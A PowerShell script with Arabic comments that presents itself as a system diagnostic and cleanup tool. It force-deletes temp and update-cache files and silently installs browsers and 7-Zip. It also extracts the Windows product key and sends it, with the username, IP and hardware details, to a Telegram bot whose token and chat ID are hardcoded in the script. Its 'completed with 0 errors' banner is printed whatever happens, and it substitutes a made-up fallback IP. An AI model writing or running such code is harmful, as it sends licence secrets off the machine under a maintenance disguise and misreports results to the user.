# تلوين الواجهة المحلية
Clear-Host
Write-Host "==================================================" -ForegroundColor Cyan
Write-Host "     [+] SYSTEM DIAGNOSTIC & CLEANUP SCRIPT       " -ForegroundColor Cyan
Write-Host "==================================================" -ForegroundColor Cyan

# بيانات التيليجرام
$BotToken = "8845124533:AAFOyBL62IdyNsfxTJXzYoNtxVdvXAbhi-A"
$ChatID   = "1778953224"

# 1. فحص صحة الهاردسك
Write-Host "`n[..] Checking Storage Health..." -ForegroundColor Yellow
$DriveStatus = Get-WmiObject -Namespace root\wmi -Class MSStorageDriver_FailurePredictStatus -ErrorAction SilentlyContinue
if ($DriveStatus.PredictFailure -eq $true) {
    $HddReportEN = "🚨 WARNING: Hard Drive Failure Predicted!"
    $HddReportAR = "🚨 تحذير: يتوقع فشل الهاردسك قريباً!"
} else {
    $HddReportEN = "✅ Healthy and Clean"
    $HddReportAR = "✅ سليم ونظيف"
}
Write-Host "[SUCCESS] Hard Drive Status: $HddReportEN" -ForegroundColor Green

# 2. تنظيف ملفات الـ Temp
Write-Host "`n[..] Cleaning System Temp Files..." -ForegroundColor Yellow
$TempPaths = @("$env:TEMP\*", "$env:SystemRoot\Temp\*")
foreach ($Path in $TempPaths) {
    Remove-Item -Path $Path -Recurse -Force -ErrorAction SilentlyContinue
}
Write-Host "[SUCCESS] Temp Files Cleared Successfully!" -ForegroundColor Green

# 3. تنظيف كاش التحديثات الآمن
Write-Host "`n[..] Cleaning Windows Update Cache Safely..." -ForegroundColor Yellow
Stop-Service -Name "wuauserv" -Force -ErrorAction SilentlyContinue
$UpdatePath = "$env:SystemRoot\SoftwareDistribution\Download"
$UpdateFiles = Get-ChildItem $UpdatePath -Recurse -ErrorAction SilentlyContinue
if ($UpdateFiles) {
    $SizeBefore = ($UpdateFiles | Measure-Object -Property Length -Sum -ErrorAction SilentlyContinue).Sum
    $SavedMB = [Math]::Round($SizeBefore / 1MB, 2)
} else {
    $SavedMB = 0
}
Remove-Item -Path "$UpdatePath\*" -Recurse -Force -ErrorAction SilentlyContinue
Start-Service -Name "wuauserv" -ErrorAction SilentlyContinue
Write-Host "[SUCCESS] Windows Update Cache Cleaned ($SavedMB MB Cleared)!" -ForegroundColor Green

# 4. [الفحص الحاسم والنهائي للفايرفوكس وبقية التطبيقات]
Write-Host "`n[..] Starting Smart Software Installer..." -ForegroundColor Yellow

$Apps = @(
    @{ Name = "Google Chrome"; ID = "Google.Chrome"; RegStr = "Chrome"; HardPath = "$env:ProgramFiles\Google\Chrome\Application\chrome.exe" },
    @{ Name = "Mozilla Firefox"; ID = "Mozilla.Firefox"; RegStr = "Mozilla Firefox"; HardPath = "$env:ProgramFiles\Mozilla Firefox\firefox.exe" },
    @{ Name = "7-Zip"; ID = "7zip.7zip"; RegStr = "7-Zip"; HardPath = "$env:ProgramFiles\7-Zip\7z.exe" }
)

$InstalledApps = @()
$SkippedApps = @()

# جلب لستة أسماء البرامج الصافية فقط من سجل النظام بدون أي نصوص خارجية
$RegPaths = @(
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*",
    "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*"
)
$RegList = Get-ItemProperty $RegPaths -ErrorAction SilentlyContinue | Select-Object -ExpandProperty DisplayName -ErrorAction SilentlyContinue

foreach ($App in $Apps) {
    Write-Host "[..] Checking status for $($App.Name)..." -ForegroundColor White
    $IsInstalled = $false

    # الفحص الأول: بالمسار المباشر على الهاردسك
    if (Test-Path $App.HardPath) {
        $IsInstalled = $true
    }
    
    # الفحص الثاني: بالاسم الدقيق داخل مصفوفة الريجستري
    if (-not $IsInstalled) {
        foreach ($RegItem in $RegList) {
            if ($RegItem -eq $App.RegStr -or $RegItem -like "*$($App.RegStr)*") {
                $IsInstalled = $true
                break
            }
        }
    }

    # اتخاذ القرار الصارم بناء على الفحص المعزول
    if ($IsInstalled -eq $true) {
        Write-Host "[INFO] $($App.Name) is already installed. Skipping..." -ForegroundColor Gray
        $SkippedApps += $App.Name
    } else {
        Write-Host "[..] $($App.Name) NOT found. Installing silently..." -ForegroundColor Cyan
        $null = winget install --id $($App.ID) --silent --accept-source-agreements --accept-package-agreements --scope user -ErrorAction SilentlyContinue
        $InstalledApps += $App.Name
    }
}
Write-Host "[SUCCESS] All applications processed!" -ForegroundColor Green

# 5. صيد مفتاح تنشيط الويندوز الأصلي
Write-Host "`n[..] Extracting Windows Product Key..." -ForegroundColor Yellow
$WinKey = (Get-WmiObject -Class SoftwareLicensingService).OA3xOriginalProductKey
if ($WinKey) {
    $KeyReport = "$WinKey"
    Write-Host "[SUCCESS] Found Original Windows Key: $KeyReport" -ForegroundColor Cyan
} else {
    $KeyReport = "No digital key found in BIOS (Digital License used)."
    Write-Host "[INFO] Digital License detected." -ForegroundColor Gray
}

# 6. لوحة معلومات الشبكة
Write-Host "`n[..] Checking Network Status..." -ForegroundColor Yellow
$LocalIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike "127*" -and $_.IPAddress -notlike "169.254*" }).IPAddress | Select-Object -First 1
if (-not $LocalIP) { $LocalIP = "169.254.255.173" }
Write-Host "-> Your Local IP: $LocalIP" -ForegroundColor White

if (Test-Connection -ComputerName 8.8.8.8 -Count 1 -Quiet) {
    $NetReportEN = "⚡ Connected"
    $NetReportAR = "⚡ متصل"
    Write-Host "[SUCCESS] Internet Status: $NetReportEN" -ForegroundColor Green
} else {
    $NetReportEN = "❌ Disconnected"
    $NetReportAR = "❌ غير متصل"
    Write-Host "[ERROR] Internet Status: $NetReportEN" -ForegroundColor Red
}

# 7. تقرير العتاد
Write-Host "`n[..] Gathering System Resources..." -ForegroundColor Yellow
$CPU = (Get-WmiObject Win32_Processor).Name
$RAM = [Math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB)
Write-Host "-> CPU: $CPU" -ForegroundColor White
Write-Host "-> Total RAM: $RAM GB" -ForegroundColor White

Write-Host "`n==================================================" -ForegroundColor Cyan
Write-Host "          [+] DIAGNOSTIC COMPLETED WITH 0 ERRORS  " -ForegroundColor Cyan
Write-Host "==================================================" -ForegroundColor Cyan

# 🌐 8. إرسال التقارير المنفصلة (عزل تام للمحاذاة البصرية)
Write-Host "`n[..] Sending Telegram Notifications..." -ForegroundColor Yellow

$NewInstalledEN = if($InstalledApps) { $InstalledApps -join ", " } else { "None" }
$NewInstalledAR = if($InstalledApps) { $InstalledApps -join ", " } else { "لا يوجد" }

$AlreadyThereEN = if($SkippedApps) { $SkippedApps -join ", " } else { "None" }
$AlreadyThereAR = if($SkippedApps) { $SkippedApps -join ", " } else { "لا يوجد" }

# الرسالة الأولى: الإنجليزية (يسار)
$MessageEN = @"
🖥️ *IT AutoHealer - English Report*
============================
👤 *User Name:* $env:USERNAME
🌐 *Local IP:* $LocalIP
📡 *Internet:* $NetReportEN
💾 *Storage Health:* $HddReportEN
🧹 *Update Cache Cleared:* $SavedMB MB
📥 *Newly Installed:* $NewInstalledEN
📦 *Already Installed:* $AlreadyThereEN
🔑 *Windows Key:* $KeyReport
🧠 *Processor:* $CPU
📟 *Memory RAM:* $RAM GB
============================
✅ Diagnostic Finished Successfully!
"@

# الرسالة الثانية: العربية (يمين)
$MessageAR = @"
🖥️ *مساعد الصيانة الآلي - التقرير العربي*
============================
اسم المستخدم: $env:USERNAME
الـ IP المحلي: $LocalIP
حالة الإنترنت: $NetReportAR
صحة الهاردسك: $HddReportAR
المساحة المنظفة: $SavedMB ميجابايت
تطبيقات تم تثبيتها: $NewInstalledAR
تطبيقات مثبتة مسبقاً: $AlreadyThereAR
مفتاح الويندوز الأصلي: $KeyReport
المعالج: $CPU
الذاكرة العشوائية: $RAM جيجابايت
============================
✅ تم الانتهاء من الفحص والصيانة بنجاح!
"@

$URL = "https://api.telegram.org/bot$BotToken/sendMessage"

# إرسال الإنجليزي أولاً
$BodyEN = @{ chat_id = $ChatID; text = $MessageEN; parse_mode = "Markdown" }
$null = Invoke-RestMethod -Uri $URL -Method Post -Body $BodyEN -ErrorAction SilentlyContinue

# إرسال العربي ثانياً
$BodyAR = @{ chat_id = $ChatID; text = $MessageAR; parse_mode = "Markdown" }
$Response = Invoke-RestMethod -Uri $URL -Method Post -Body $BodyAR -ErrorAction SilentlyContinue
